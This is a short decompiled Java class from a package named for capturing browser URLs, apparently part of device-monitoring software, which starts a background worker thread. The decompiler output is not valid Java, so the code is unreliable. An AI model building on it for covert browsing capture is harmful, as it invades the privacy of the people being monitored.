package com.vvt.capture.browserurl.a;

import com.vvt.io.g;

class d
  implements g
{
  d(c paramc) {}
  
  public void a(int paramInt)
  {
    Object localObject = c.a(this.a);
    if (localObject == null)
    {
      boolean bool = c.c();
      if (bool) {}
      localObject = this.a;
      Thread localThread = new java/lang/Thread;
      e locale = new com/vvt/capture/browserurl/a/e;
      locale.<init>(this);
      localThread.<init>(locale);
      c.a((c)localObject, localThread);
      localObject = c.a(this.a);
      ((Thread)localObject).start();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/browserurl/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */